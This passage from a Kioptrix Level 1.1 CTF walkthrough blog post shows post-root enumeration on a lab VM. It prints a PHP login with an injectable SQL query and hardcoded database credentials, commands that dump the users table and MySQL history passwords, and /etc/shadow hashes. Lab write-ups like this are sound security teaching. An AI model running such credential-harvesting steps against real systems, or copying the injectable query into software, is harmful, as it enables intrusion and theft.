+</pre><td class="rouge-code"><pre>sh-3.00# <span class="nb">cd</span> /var/www/html
+sh-3.00# <span class="nb">ls
+</span>index.php
+pingit.php
+sh-3.00# <span class="nb">cat </span>index.php
+&lt;?php
+    mysql_connect<span class="o">(</span><span class="s2">"localhost"</span>, <span class="s2">"john"</span>, <span class="s2">"hiroshima"</span><span class="o">)</span> or die<span class="o">(</span>mysql_error<span class="o">())</span><span class="p">;</span>
+    //print <span class="s2">"Connected to MySQL&lt;br /&gt;"</span><span class="p">;</span>
+    mysql_select_db<span class="o">(</span><span class="s2">"webapp"</span><span class="o">)</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'uname'</span><span class="o">]</span> <span class="o">!=</span> <span class="s2">""</span><span class="o">){</span>
+        <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">'uname'</span><span class="o">]</span><span class="p">;</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">'psw'</span><span class="o">]</span><span class="p">;</span>
+        <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username = '</span><span class="nv">$username</span><span class="s2">' AND password='</span><span class="nv">$password</span><span class="s2">'"</span><span class="p">;</span>
+        //print <span class="nv">$query</span>.<span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+...
+...
+...
+</pre></table></code></div></div><p>By using john credentials we can’t access the system with ssh, but we can access the mysql database. Now try to execute command in mysql :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>sh-3.00# mysql <span class="nt">-u</span> john <span class="nt">-phiroshima</span> <span class="nt">-e</span> <span class="s1">'show databases;'</span>
+Database
+mysql
+<span class="nb">test
+</span>webapp
+sh-3.00# mysql <span class="nt">-u</span> john <span class="nt">-phiroshima</span> <span class="nt">-e</span> <span class="s1">'use webapp;show tables;'</span>
+Tables_in_webapp
+<span class="nb">users
+</span>sh-3.00# mysql <span class="nt">-u</span> john <span class="nt">-phiroshima</span> <span class="nt">-e</span> <span class="s1">'use webapp;select * from users;'</span>
+<span class="nb">id </span>username password
+1   admin   5afac8d85f
+2   john    66lajGGbla
+</pre></table></code></div></div><p>Now at-least we get the login password for users at index.php login page.</p><p>We can also look for .mysql_history file for previous typed commands by users.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre><td class="rouge-code"><pre>show databases<span class="p">;</span>
+create database webapp<span class="p">;</span>
+use webapp<span class="p">;</span>
+create table <span class="nb">users</span><span class="o">(</span><span class="nb">id </span>INT,username varchar<span class="o">(</span>100<span class="o">)</span>,password varchar<span class="o">(</span>10<span class="o">))</span><span class="p">;</span>
+show database<span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+show databases<span class="p">;</span>
+use webapp<span class="p">;</span>
+insert into <span class="nb">users </span>values<span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'hello'</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+use mysql
+show databases<span class="p">;</span>
+use mysql<span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from <span class="nb">users </span>where <span class="nv">user</span><span class="o">=</span>john<span class="p">;</span>
+show tables<span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from user where <span class="nv">user</span><span class="o">=</span>john<span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from user where <span class="nv">user</span><span class="o">=</span><span class="s1">'john'</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from user<span class="p">;</span>
+create user <span class="s1">'john'</span>@<span class="s1">'localhost'</span> identified by <span class="s1">'hiroshima'</span><span class="p">;</span>
+create user <span class="s1">'webapp'</span>@<span class="s1">'localhost'</span> identified by <span class="s1">'hiroshima'</span><span class="p">;</span>
+create user <span class="s1">'webapp'</span>@<span class="s1">'localhost'</span> IDENTIFIED BY <span class="s1">'hiroshima'</span><span class="p">;</span>
+CREATE USER <span class="s1">'webapp'</span>@<span class="s1">'localhost'</span> identified by <span class="s1">'hiroshima'</span><span class="p">;</span>
+update user <span class="nb">set </span>password <span class="o">=</span> password<span class="o">(</span><span class="s1">'hiroshima'</span><span class="o">)</span> where user <span class="o">=</span> <span class="s1">'john'</span><span class="p">;</span>
+use mysql<span class="p">;</span>
+show <span class="nb">users</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from user<span class="p">;</span>
+create user <span class="s1">'john'</span>@<span class="s1">'localhost'</span> identified by <span class="s1">'hiroshima'</span><span class="p">;</span>
+version<span class="p">;</span>
+<span class="nt">-v</span>
+<span class="p">;</span>
+<span class="nb">help
+</span>flush privileges<span class="p">;</span>
+show databases<span class="p">;</span>
+use mysql<span class="p">;</span>
+grant <span class="k">select</span>,insert,update,delete on <span class="k">*</span>.<span class="k">*</span> to <span class="s1">'john'</span>@<span class="s1">'localhost'</span><span class="p">;</span>
+update user <span class="nb">set </span>password <span class="o">=</span> password<span class="o">(</span><span class="s1">'hiroshima'</span><span class="o">)</span> where user <span class="o">=</span> <span class="s1">'john'</span><span class="p">;</span>
+flush priveleges<span class="p">;</span>
+use webapp<span class="p">;</span>
+show tables<span class="p">;</span>
+update user <span class="nb">set </span>password <span class="o">=</span> password<span class="o">(</span><span class="s1">'Ha56!blaKAbl'</span><span class="o">)</span> where user <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+update username <span class="nb">set </span>password <span class="o">=</span> password<span class="o">(</span><span class="s1">'Ha56!blaKAbl'</span><span class="o">)</span> where user <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+update username <span class="nb">set </span>password <span class="o">=</span> password<span class="o">(</span><span class="s1">'Ha56!blaKAbl'</span><span class="o">)</span> where username <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+update <span class="nb">users set </span>password <span class="o">=</span> password<span class="o">(</span><span class="s1">'Ha56!blaKAbl'</span><span class="o">)</span> where username <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+insert into <span class="nb">users </span>values<span class="o">(</span>2,<span class="s1">'john'</span>,<span class="s1">'66lajGGbla'</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+</pre></table></code></div></div><p>From /etc/shadow file we got the encrypted passwords for users</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>root:<span class="nv">$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc</span>.:14529:0:99999:7:::
+john:<span class="nv">$1$wk7kHI5I$2kNTw6ncQQCecJ</span>.5b8xTL1:14525:0:99999:7:::
+harold:<span class="nv">$1$7d</span>.sVxgm<span class="nv">$3MYWsHDv0F</span>/LP.mjL9lp/1:14529:0:99999:7:::
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-writeup/'>CTF-WriteUP</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/boot2root/" class="post-tag no-text-decoration" >Boot2root</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kioptrix Level 1.1 CTF VM WalkThrough - Ajay Kumar Tekam&url=https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kioptrix Level 1.1 CTF VM WalkThrough - Ajay Kumar Tekam&u=https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Kioptrix Level 1.1 CTF VM WalkThrough - Ajay Kumar Tekam&url=https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://ajaytekam.github.io/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/What-is-DNS-and-How-it-Works/">What is DNS and How it Works</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/boot2root/">Boot2root</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/web-security/">Web-Security</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Metasploitable2-Walkthrough/"><div class="card-body"> <span class="timeago small" > Nov 20, 2017 <i class="unloaded">2017-11-20T10:25:11+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Metasploitable2 Walkthrough</h3><div class="text-muted small"><p> VM : BasicPentesting1 Download Link : https://www.vulnhub.com/entry/basic-pentesting-1,216/ Start the VM and get the IP of VM : $ nmap -sP 192.168.1.0/24 Nmap scan report for 192.168.1.1 H...</p></div></div></a></div><div class="card"> <a href="/posts/BasicPentesting1-VM-WalkThrough/"><div class="card-body"> <span class="timeago small" > Jan 9, 2020 <i class="unloaded">2020-01-09T02:25:11+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BasicPentesting1 VM Walkthrough</h3><div class="text-muted small"><p> VM : BasicPentesting1 Download Link : https://www.vulnhub.com/entry/basic-pentesting-1,216/ Start the VM and get the IP of VM : $ nmap -sP 192.168.1.0/24 Nmap scan report for 192.168.1.1 H...</p></div></div></a></div><div class="card"> <a href="/posts/BasicPentesting2-VM-WalkThrough/"><div class="card-body"> <span class="timeago small" > Feb 2, 2020 <i class="unloaded">2020-02-02T03:10:11+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BasicPentesting2 VM WalkThrough</h3><div class="text-muted small"><p> VM : BasicPentesting2 Dwonload Link : https://www.vulnhub.com/entry/basic-pentesting-2,241/ Start the VM and get IP of VM : $ nmap -sP 192.168.56.0/24 Nmap scan report for 192.168.56.1 Host is ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Level-1-CTF-VM-WalkThrough/" class="btn btn-outline-primary"><p>Kioptrix Level 1 CTF VM WalkThrough</p></a> <a href="/posts/Kioptrix-Level-1.2-CTF-VM-WalkThrough/" class="btn btn-outline-primary"><p>Kioptrix Level 1.2 CTF VM WalkThrough</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/x90ajay">Ajay Kumar Tekam</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/boot2root/">Boot2root</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/web-security/">Web Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ajaytekam.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
